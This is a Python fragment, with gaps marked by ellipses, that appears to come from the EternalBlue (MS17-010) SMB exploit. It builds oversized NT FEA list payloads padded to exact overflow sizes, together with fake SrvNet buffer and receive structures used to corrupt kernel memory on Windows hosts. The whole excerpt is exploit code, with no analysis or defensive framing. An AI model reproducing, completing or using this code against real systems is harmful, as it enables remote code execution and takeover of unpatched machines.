...
ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + ('A'*0xffde).encode('ascii')

ntfea11000 = (pack('<BBH', 0, 0, 0) + ('\x00').encode('ascii'))*600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + ('A'*0xf3be).encode('ascii')  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc

ntfea1f000 = (pack('<BBH', 0, 0, 0) + ('\x00').encode('ascii'))*0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack('<BBH', 0, 0, 0x48ed) + ('A'*0x48ee).encode('ascii')
 # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec
...
fakeSrvNetBufferNsa += ('\x00').encode('ascii')*16
...
fakeSrvNetBufferX64 += ('\x00').encode('ascii')*16
fakeSrvNetBufferX64 += ('\x00').encode('ascii')*16
fakeSrvNetBufferX64 += ('\x00').encode('ascii')*16  # 0x40
...
fake_recv_struct += ('\x00').encode('ascii')*16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += (('\x00').encode('ascii')*16)*7
...
fake_recv_struct += (('\x00').encode('ascii')*16)*11
...
fake_recv_struct += (('\x00').encode('ascii')*16)*3
